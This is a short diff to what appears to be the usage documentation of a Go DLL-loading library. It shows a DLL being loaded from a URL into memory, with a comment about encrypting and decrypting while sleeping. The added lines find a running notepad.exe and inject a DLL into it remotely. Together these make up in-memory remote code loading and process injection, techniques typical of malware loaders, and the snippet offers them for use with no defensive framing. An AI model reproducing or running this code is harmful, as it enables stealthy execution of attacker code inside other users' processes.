@@ -32,6 +32,20 @@ mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "ExportedFuncti
 // load dll from url without sleep before encrypt/decrypt finishes
 mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "ExportedFunction")
 
+pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
+if err != nil {
+	log.Printf("[main] failed to find process: %v", err)
+	fmt.Println("failed to find process", err)
+	return
+}
+_, err = pe.LoadDLLRemote(pHandle, pid, "path/to/dll.dll", "ExportedFunction")
+if err != nil {
+	log.Printf("[main] LoadDLLRemote failed: %v", err)
+	fmt.Println("failed to load", err)
+	return
+}
+log.Printf("[main] LoadDLLRemote succeeded")
+
 // check currently mapped dlls
 baseAddrs, sizes, count := pe.GetMap()
 
